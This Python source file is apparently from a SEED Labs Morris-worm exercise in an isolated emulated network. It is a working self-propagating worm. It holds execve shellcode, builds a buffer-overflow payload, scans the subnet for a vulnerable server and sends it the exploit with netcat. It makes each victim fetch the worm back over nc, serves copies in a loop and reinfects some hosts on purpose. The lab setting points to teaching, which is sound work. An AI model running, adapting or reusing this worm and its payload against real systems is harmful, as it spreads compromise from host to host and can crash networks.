#!/bin/env python3
import sys
import os
import time
import socket
import subprocess
from random import randint, shuffle

# Task 4 config
SUBNET         = "10.151.0."   # nano Internet range
VULN_PORT      = 9090          # SEED vulnerable server (runs on every host = a real target)
WORM_PORT      = 7070          # worm's own serve loop (open == host already infected)
REINFECT_1_IN  = 7            # deliberate Morris re-infection rate (~1 in 7)

# Task 3
# This host's own IP - the victim pulls worm.py from here
myIP = subprocess.check_output("hostname -I", shell=True).decode().split()[0]

# You can use this shellcode to run any command you want
shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   "nc -w5 10.151.0.1 7070 > worm.py;                           "
   "                                                            "
   "                                                           *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')


# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   # Derived from the server's printed ebp/buffer (see §4.1).
   # If the attack fails on your machine, re-derive: offset = ebp - buffer + 4, ret = ebp + ~100
   ret    = 0xffffd65c
   offset = 116

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)


# Is a TCP port open on ip? Used both to find live targets (9090)
# and to detect an already-infected host (7070).
def is_port_open(ip, port, timeout=2):
   try:
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.settimeout(timeout)
         return s.connect_ex((ip, port)) == 0
   except OSError:
      return False


# Task 7: an infected host is already running the serve loop on WORM_PORT,
# so that port answering is the worm's "already here" marker.
def already_infected(ip):
   return is_port_open(ip, WORM_PORT)


# Find the next victim (return an IP address, or None if none found).
# Scans the nano Internet for a host with the vulnerable server up,
# skipping ourselves and (usually) hosts already infected.
def getNextTarget():
   candidates = list(range(2, 255))
   shuffle(candidates)
   for h in candidates:
      ip = SUBNET + str(h)
      if ip == myIP:
         continue
      # Must have the vulnerable server listening to be a real target.
      if not is_port_open(ip, VULN_PORT):
         continue
      # Normally skip already-infected hosts -- but re-infect ~1 in REINFECT_1_IN
      # anyway. This is the famous Morris bug: it defeats fake "I'm infected"
      # signals, but piles up processes until hosts crash (Ewaoluwa's defense demo).
      if already_infected(ip) and randint(1, REINFECT_1_IN) != 1:
         continue
      return ip
   return None


############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

# Create the badfile 
createBadfile()

# Task 3: self-duplication
# Serve this worm's own copy to the next victim 
subprocess.Popen(["while true; do nc -lnv 7070 -q1 < worm.py; done"], shell=True)

# Task 8: log every infection so Ewaoluwa can build propagation curves.
# Format (AGREE WITH EWAOLUWA before the 275-node run): epoch_ts,source_ip,target_ip
def log_infection(targetIP):
    with open("infections.log", "a") as f:
        f.write(f"{time.time():.3f},{myIP},{targetIP}\n")


# Launch the attack on other servers -- spread until the subnet is saturated.
while True:
    targetIP = getNextTarget()

    # No reachable, not-already-infected target right now -- wait and rescan.
    if targetIP is None:
        time.sleep(10)
        continue

    # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)
    log_infection(targetIP)

    # Give the shellcode some time to run on the target host
    time.sleep(1)

    # Sleep for 10 seconds before attacking another host
    time.sleep(10)
